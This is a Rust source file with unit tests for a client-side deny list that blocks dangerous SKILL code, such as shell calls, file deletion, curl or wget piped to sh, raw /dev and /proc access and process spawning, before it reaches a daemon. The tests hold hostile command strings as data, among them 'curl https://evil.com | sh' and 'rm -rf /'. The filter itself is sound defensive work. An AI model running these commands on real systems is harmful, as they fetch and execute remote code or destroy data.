//! evalstring whitelist — blocks dangerous SKILL patterns at the CLI client side,
//! before the request is serialized and sent over TCP to the daemon.

/// Whitelist entry type.
#[derive(Clone, Copy, Debug)]
#[allow(dead_code)]
pub enum WhitelistEntry {
    /// Case-insensitive substring match
    Substring(&'static str),
    /// Word-boundary match on a function name (e.g. `system(`)
    FunctionName(&'static str),
}

impl WhitelistEntry {
    fn matches(&self, code: &str) -> bool {
        match self {
            Self::Substring(needle) => code.to_lowercase().contains(&needle.to_lowercase()),
            Self::FunctionName(name) => code.to_lowercase().contains(&format!("{name}(")),
        }
    }
}

/// Default dangerous patterns to block.
fn default_dangerous() -> Vec<WhitelistEntry> {
    vec![
        // Shell invocations
        WhitelistEntry::Substring("system("),
        WhitelistEntry::Substring("sh("),
        WhitelistEntry::Substring("csh "),
        WhitelistEntry::Substring("exec("),
        WhitelistEntry::Substring("pipe("),
        // File deletion
        WhitelistEntry::Substring("rm -rf"),
        WhitelistEntry::Substring("deleteFile("),
        WhitelistEntry::Substring("unlink("),
        WhitelistEntry::Substring("rmdir("),
        // Network fetch + execute (curl/wget with shell redirect or pipe)
        WhitelistEntry::Substring("curl "),
        WhitelistEntry::Substring("wget "),
        WhitelistEntry::Substring("| sh"),
        WhitelistEntry::Substring("|sh"),
        WhitelistEntry::Substring("; sh"),
        WhitelistEntry::Substring(";sh"),
        // Raw disk I/O
        WhitelistEntry::Substring("dd "),
        WhitelistEntry::Substring("/dev/"),
        WhitelistEntry::Substring("/proc/"),
        // Process / IPC injection
        WhitelistEntry::Substring("ipcBeginProcess"),
        WhitelistEntry::Substring("send("),
        WhitelistEntry::Substring("load(\""),
        // SKILL evalstring bypass
        WhitelistEntry::Substring("evalstring"),
        WhitelistEntry::Substring("evstring"),
    ]
}

/// evalstring whitelist with sandbox mode.
#[derive(Clone, Debug)]
pub struct EvalstringWhitelist {
    entries: Vec<WhitelistEntry>,
    /// When true, evalstring itself is disabled (readonly/sandbox mode)
    sandbox: bool,
}

impl Default for EvalstringWhitelist {
    fn default() -> Self {
        Self::strict()
    }
}

impl EvalstringWhitelist {
    /// Strict whitelist for normal CLI use — blocks dangerous patterns.
    pub fn strict() -> Self {
        Self {
            entries: default_dangerous(),
            sandbox: false,
        }
    }

    /// Sandbox mode — blocks everything except read-only queries.
    #[allow(dead_code)]
    pub fn sandbox() -> Self {
        Self {
            entries: default_dangerous(),
            sandbox: true,
        }
    }

    /// Returns `Some(reason)` if the code is blocked.
    pub fn check(&self, code: &str) -> Option<String> {
        if self.sandbox && code.contains("evalstring") {
            return Some("evalstring is disabled in readonly/sandbox mode".into());
        }
        for entry in &self.entries {
            if entry.matches(code) {
                return Some(format!(
                    "blocked: matches dangerous pattern '{}'",
                    match entry {
                        WhitelistEntry::Substring(s) => *s,
                        WhitelistEntry::FunctionName(n) => *n,
                    }
                ));
            }
        }
        None
    }

    /// Enable sandbox/readonly mode.
    pub fn enable_sandbox(&mut self) {
        self.sandbox = true;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn wl() -> EvalstringWhitelist {
        EvalstringWhitelist::strict()
    }

    fn sandbox_wl() -> EvalstringWhitelist {
        EvalstringWhitelist::sandbox()
    }

    #[test]
    fn block_rm_rf() {
        assert!(wl().check("rm -rf /").is_some());
        assert!(wl().check("system(\"rm -rf /\")").is_some());
    }

    #[test]
    fn block_curl_sh() {
        assert!(wl().check("curl https://evil.com | sh").is_some());
        assert!(wl().check("wget https://evil.com -O - | sh").is_some());
    }

    #[test]
    fn block_system() {
        assert!(wl().check("system(\"find /\")").is_some());
        assert!(wl().check("sh(\"ls -la\")").is_some());
    }

    #[test]
    fn block_ipc() {
        assert!(wl().check("ipcBeginProcess(\"ls\")").is_some());
        assert!(wl().check("load(\"/tmp/evil.il\")").is_some());
    }

    #[test]
    fn block_evalstring() {
        assert!(wl().check("evalstring(\"system()\")").is_some());
    }

    #[test]
    fn sandbox_blocks_evalstring() {
        let mut w = wl();
        w.enable_sandbox();
        assert!(w.check("evalstring(\"system()\")").is_some());
        assert!(w.check("1+1").is_none()); // sandbox blocks evalstring, not safe code
    }

    #[test]
    fn allow_safe_code() {
        let w = wl();
        assert!(w.check("1+1").is_none());
        assert!(w
            .check("dbOpenCellViewByType(\"analogLib\" \"nmos4\" \"symbol\")")
            .is_none());
        assert!(w.check("maeSetVar(\"Vdd\" \"1.8\")").is_none());
        assert!(w.check("geGetEditCellView()~>cellName").is_none());
    }

    #[test]
    fn allow_safe_code_sandbox() {
        let w = sandbox_wl();
        // evalstring itself is blocked
        assert!(w.check("evalstring(\"1+1\")").is_some());
        // but read-only expressions not containing evalstring are fine
        assert!(w
            .check("dbOpenCellViewByType(\"analogLib\" \"nmos4\" \"symbol\")")
            .is_none());
    }

    #[test]
    fn block_dev_proc() {
        assert!(wl().check("dd if=/dev/zero of=/tmp/x").is_some());
        assert!(wl().check("/proc/self/cmdline").is_some());
    }
}
